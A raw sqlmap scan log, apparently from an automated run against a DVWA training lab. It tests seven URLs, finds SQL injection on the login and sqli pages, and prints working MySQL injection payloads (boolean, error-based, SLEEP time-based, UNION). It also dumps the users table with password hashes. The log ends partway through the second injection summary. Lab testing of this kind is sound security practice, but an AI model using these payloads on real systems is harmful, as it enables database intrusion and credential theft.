@@ -1,0 +1,503 @@
+--- Iniciando SQLMap en segundo plano ---
+[1/7] Testeando: http://dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=ZAP
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:23:41 /2026-08-02/
+
+[02:23:41] [INFO] testing connection to the target URL
+[02:23:41] [CRITICAL] page not found (404)
+
+[*] ending @ 02:23:41 /2026-08-02/
+
+[2/7] Testeando: http://dvwa/vulnerabilities/fi/?page=include.php
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:23:42 /2026-08-02/
+
+[02:23:42] [INFO] testing connection to the target URL
+[02:23:42] [INFO] searching for forms
+[02:23:42] [CRITICAL] there were no forms found at the given target URL
+
+[*] ending @ 02:23:42 /2026-08-02/
+
+[3/7] Testeando: http://dvwa/vulnerabilities/csrf/?Change=Change&password_conf=ZAP&password_new=ZAP
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.7.253#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:23:43 /2026-08-02/
+
+[02:23:43] [INFO] testing connection to the target URL
+[02:23:44] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change
+Cookie: PHPSESSID=7c0ujr5t6mk6ulkpulut54eut7; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: password_new=&password_conf=&Change=Change]: password_new=&password_conf=&Change=Change
+do you want to fill blank fields with random values? [Y/n] Y
+[02:23:44] [INFO] using '/root/.local/share/sqlmap/output/results-08022026_0223am.csv' as the CSV results file in multiple targets mode
+[02:23:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:23:44] [INFO] testing NULL connection to the target URL
+[02:23:44] [INFO] NULL connection is supported with GET method ('Range')
+[02:23:44] [INFO] testing if the target URL content is stable
+[02:23:44] [INFO] target URL content is stable
+[02:23:44] [INFO] testing if GET parameter 'password_new' is dynamic
+[02:23:44] [WARNING] GET parameter 'password_new' does not appear to be dynamic
+[02:23:44] [WARNING] heuristic (basic) test shows that GET parameter 'password_new' might not be injectable
+[02:23:44] [INFO] testing for SQL injection on GET parameter 'password_new'
+[02:23:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:23:45] [WARNING] time-based comparison requires larger statistical model, please wait................. (done)
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[02:23:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[02:23:45] [WARNING] GET parameter 'password_new' does not seem to be injectable
+[02:23:45] [INFO] testing if GET parameter 'password_conf' is dynamic
+[02:23:45] [WARNING] GET parameter 'password_conf' does not appear to be dynamic
+[02:23:45] [WARNING] heuristic (basic) test shows that GET parameter 'password_conf' might not be injectable
+[02:23:45] [INFO] testing for SQL injection on GET parameter 'password_conf'
+[02:23:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[02:23:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[02:23:45] [WARNING] GET parameter 'password_conf' does not seem to be injectable
+[02:23:45] [INFO] testing if GET parameter 'Change' is dynamic
+[02:23:45] [WARNING] GET parameter 'Change' does not appear to be dynamic
+[02:23:45] [WARNING] heuristic (basic) test shows that GET parameter 'Change' might not be injectable
+[02:23:45] [INFO] testing for SQL injection on GET parameter 'Change'
+[02:23:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:23:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:23:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[02:23:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[02:23:45] [WARNING] GET parameter 'Change' does not seem to be injectable
+[02:23:45] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+[02:23:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08022026_0223am.csv'
+
+[*] ending @ 02:23:45 /2026-08-02/
+
+[4/7] Testeando: http://dvwa/vulnerabilities/xss_d/?default
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:23:46 /2026-08-02/
+
+[02:23:46] [INFO] testing connection to the target URL
+[02:23:46] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/xss_d/?default=" %2B lang %2B "
+Cookie: PHPSESSID=7c0ujr5t6mk6ulkpulut54eut7; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: default=" %2B lang %2B "]: default=" %2B lang %2B "
+it appears that provided value for GET parameter 'default' has boundaries. Do you want to inject inside? ('" %2B lang %2B* "') [y/N] N
+[02:23:47] [INFO] flushing session file
+[02:23:47] [INFO] using '/root/.local/share/sqlmap/output/results-08022026_0223am.csv' as the CSV results file in multiple targets mode
+[02:23:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:23:47] [INFO] testing NULL connection to the target URL
+[02:23:47] [INFO] NULL connection is supported with GET method ('Range')
+[02:23:47] [INFO] testing if the target URL content is stable
+[02:23:47] [INFO] target URL content is stable
+[02:23:47] [INFO] testing if GET parameter 'default' is dynamic
+[02:23:47] [WARNING] GET parameter 'default' does not appear to be dynamic
+[02:23:47] [WARNING] heuristic (basic) test shows that GET parameter 'default' might not be injectable
+[02:23:47] [INFO] testing for SQL injection on GET parameter 'default'
+[02:23:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:23:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:23:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:23:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:23:47] [WARNING] time-based comparison requires larger statistical model, please wait................. (done)
+[02:23:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[02:23:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[02:23:48] [WARNING] GET parameter 'default' does not seem to be injectable
+[02:23:48] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+[02:23:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08022026_0223am.csv'
+
+[*] ending @ 02:23:48 /2026-08-02/
+
+[5/7] Testeando: http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:23:49 /2026-08-02/
+
+[02:23:49] [INFO] testing connection to the target URL
+[02:23:49] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/brute/?username=&password=&Login=Login
+Cookie: PHPSESSID=7c0ujr5t6mk6ulkpulut54eut7; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: username=&password=&Login=Login]: username=&password=&Login=Login
+do you want to fill blank fields with random values? [Y/n] Y
+[02:23:49] [INFO] flushing session file
+[02:23:49] [INFO] using '/root/.local/share/sqlmap/output/results-08022026_0223am.csv' as the CSV results file in multiple targets mode
+[02:23:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:23:49] [INFO] testing NULL connection to the target URL
+[02:23:49] [INFO] NULL connection is supported with GET method ('Range')
+[02:23:49] [INFO] testing if the target URL content is stable
+[02:23:50] [INFO] target URL content is stable
+[02:23:50] [INFO] testing if GET parameter 'username' is dynamic
+[02:23:50] [WARNING] GET parameter 'username' does not appear to be dynamic
+[02:23:50] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[02:23:50] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[02:23:50] [INFO] testing for SQL injection on GET parameter 'username'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] Y
+[02:23:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:23:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:23:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:23:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:23:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:23:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[02:23:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[02:23:51] [INFO] GET parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
+[02:23:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:23:51] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:23:51] [INFO] testing 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)'
+[02:23:51] [INFO] testing 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)'
+[02:23:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:23:51] [WARNING] reflective value(s) found and filtering out
+[02:23:51] [INFO] GET parameter 'username' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
+[02:23:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[02:23:51] [WARNING] time-based comparison requires larger statistical model, please wait...................... (done)
+[02:23:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[02:23:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:23:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:23:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[02:23:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[02:23:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:24:01] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[02:24:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[02:24:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[02:24:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[02:24:01] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[02:24:01] [INFO] target URL appears to have 8 columns in query
+[02:24:01] [INFO] GET parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 280 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=fTLp' RLIKE (SELECT (CASE WHEN (7092=7092) THEN 0x66544c70 ELSE 0x28 END))-- SYHv&password=GRPL&Login=Login
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: username=fTLp' AND EXTRACTVALUE(5556,CONCAT(0x5c,0x7162767a71,(SELECT (ELT(5556=5556,1))),0x716a627171))-- rUAr&password=GRPL&Login=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=fTLp' AND (SELECT 8202 FROM (SELECT(!SLEEP(5)))CNxF)-- lRRS&password=GRPL&Login=Login
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: username=fTLp' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162767a71,0x734644535748477a50784f70465a594b734a655941616d497769695347486f47436c6e784742676a,0x716a627171),NULL,NULL#&password=GRPL&Login=Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[02:24:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+[02:24:01] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[02:24:01] [INFO] fetching current database
+[02:24:01] [INFO] fetching tables for database: 'dvwa'
+[02:24:01] [INFO] starting 2 threads
+[02:24:01] [INFO] retrieved: 'users'
+[02:24:01] [INFO] retrieved: 'guestbook'
+[02:24:01] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
+[02:24:01] [INFO] starting 3 threads
+[02:24:01] [INFO] retrieved: 'comment_id','smallint(5) unsigned'
+[02:24:01] [INFO] retrieved: 'comment','varchar(300)'
+[02:24:01] [INFO] retrieved: 'name','varchar(100)'
+[02:24:01] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+| 1          | test   | This is a test comment. |
++------------+--------+-------------------------+
+
+[02:24:01] [INFO] table 'dvwa.guestbook' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/guestbook.csv'
+[02:24:01] [INFO] fetching columns for table 'users' in database 'dvwa'
+[02:24:01] [INFO] starting 5 threads
+[02:24:01] [INFO] retrieved: 'user_id','int(6)'
+[02:24:01] [INFO] retrieved: 'first_name','varchar(15)'
+[02:24:01] [INFO] retrieved: 'user','varchar(15)'
+[02:24:01] [INFO] retrieved: 'last_name','varchar(15)'
+[02:24:01] [INFO] retrieved: 'password','varchar(32)'
+[02:24:01] [INFO] retrieved: 'avatar','varchar(70)'
+[02:24:01] [INFO] retrieved: 'last_login','timestamp'
+[02:24:01] [INFO] retrieved: 'failed_login','int(3)'
+[02:24:01] [INFO] fetching entries for table 'users' in database 'dvwa'
+[02:24:01] [INFO] starting 5 threads
+[02:24:01] [INFO] retrieved: 'admin','/hackable/users/admin.jpg','0','admin',...
+[02:24:01] [INFO] retrieved: '1337','/hackable/users/1337.jpg','0','Hack','20...
+[02:24:01] [INFO] retrieved: 'gordonb','/hackable/users/gordonb.jpg','0','Gor...
+[02:24:01] [INFO] retrieved: 'pablo','/hackable/users/pablo.jpg','0','Pablo',...
+[02:24:01] [INFO] retrieved: 'smithy','/hackable/users/smithy.jpg','0','Bob',...
+[02:24:02] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [y/N/q] N
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 903a98d709fa4683aaaa036b84c125a6 | admin     | admin      | 2026-08-02 02:23:43 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-08-02 02:20:20 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-08-02 02:20:20 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-08-02 02:20:20 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-08-02 02:20:20 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[02:24:02] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/users.csv'
+[02:24:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08022026_0223am.csv'
+
+[*] ending @ 02:24:02 /2026-08-02/
+
+[6/7] Testeando: http://dvwa/vulnerabilities/xss_r/?name=ZAP
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:24:02 /2026-08-02/
+
+[02:24:02] [INFO] testing connection to the target URL
+[02:24:03] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/xss_r/?name=
+Cookie: PHPSESSID=7c0ujr5t6mk6ulkpulut54eut7; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: name=]: name=
+do you want to fill blank fields with random values? [Y/n] Y
+[02:24:03] [INFO] flushing session file
+[02:24:03] [INFO] using '/root/.local/share/sqlmap/output/results-08022026_0224am.csv' as the CSV results file in multiple targets mode
+[02:24:03] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:24:03] [INFO] testing NULL connection to the target URL
+[02:24:03] [INFO] NULL connection is supported with GET method ('Range')
+[02:24:03] [INFO] testing if the target URL content is stable
+[02:24:03] [INFO] target URL content is stable
+[02:24:03] [INFO] testing if GET parameter 'name' is dynamic
+[02:24:03] [WARNING] GET parameter 'name' does not appear to be dynamic
+[02:24:03] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
+[02:24:04] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
+[02:24:04] [INFO] testing for SQL injection on GET parameter 'name'
+[02:24:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:24:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:24:04] [WARNING] reflective value(s) found and filtering out
+[02:24:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:24:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:24:04] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:24:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:24:04] [WARNING] time-based comparison requires larger statistical model, please wait................. (done)
+[02:24:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[02:24:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[02:24:04] [WARNING] GET parameter 'name' does not seem to be injectable
+[02:24:04] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+[02:24:04] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08022026_0224am.csv'
+
+[*] ending @ 02:24:04 /2026-08-02/
+
+[7/7] Testeando: http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.7.253#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:24:05 /2026-08-02/
+
+[02:24:05] [INFO] testing connection to the target URL
+[02:24:05] [INFO] searching for forms
+[1/1] Form:
+GET http://dvwa/vulnerabilities/sqli/?id=&Submit=Submit
+Cookie: PHPSESSID=7c0ujr5t6mk6ulkpulut54eut7; security=low
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
+do you want to fill blank fields with random values? [Y/n] Y
+[02:24:05] [INFO] flushing session file
+[02:24:05] [INFO] using '/root/.local/share/sqlmap/output/results-08022026_0224am.csv' as the CSV results file in multiple targets mode
+[02:24:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:24:05] [INFO] testing NULL connection to the target URL
+[02:24:05] [INFO] NULL connection is supported with GET method ('Range')
+[02:24:05] [INFO] testing if the target URL content is stable
+[02:24:06] [INFO] target URL content is stable
+[02:24:06] [INFO] testing if GET parameter 'id' is dynamic
+[02:24:06] [WARNING] GET parameter 'id' does not appear to be dynamic
+[02:24:06] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:24:06] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[02:24:06] [INFO] testing for SQL injection on GET parameter 'id'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] Y
+[02:24:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:24:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:24:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:24:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:24:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:24:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[02:24:07] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable 
+[02:24:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:24:07] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:24:07] [INFO] testing 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)'
+[02:24:07] [INFO] testing 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)'
+[02:24:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:24:07] [WARNING] reflective value(s) found and filtering out
+[02:24:07] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
+[02:24:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[02:24:07] [WARNING] time-based comparison requires larger statistical model, please wait...................... (done)
+[02:24:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[02:24:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:24:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:24:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[02:24:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[02:24:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:24:17] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[02:24:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[02:24:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[02:24:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[02:24:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[02:24:17] [INFO] target URL appears to have 2 columns in query
+[02:24:17] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[02:24:17] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 247 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=7762' OR NOT 2400=2400#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=7762' AND EXTRACTVALUE(7846,CONCAT(0x5c,0x716b787671,(SELECT (ELT(7846=7846,1))),0x716b767a71))-- SgYu&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=7762' AND (SELECT 7120 FROM (SELECT(!SLEEP(5)))rgOD)-- sNIw&Submit=Submit
+
+    Type: UNION query
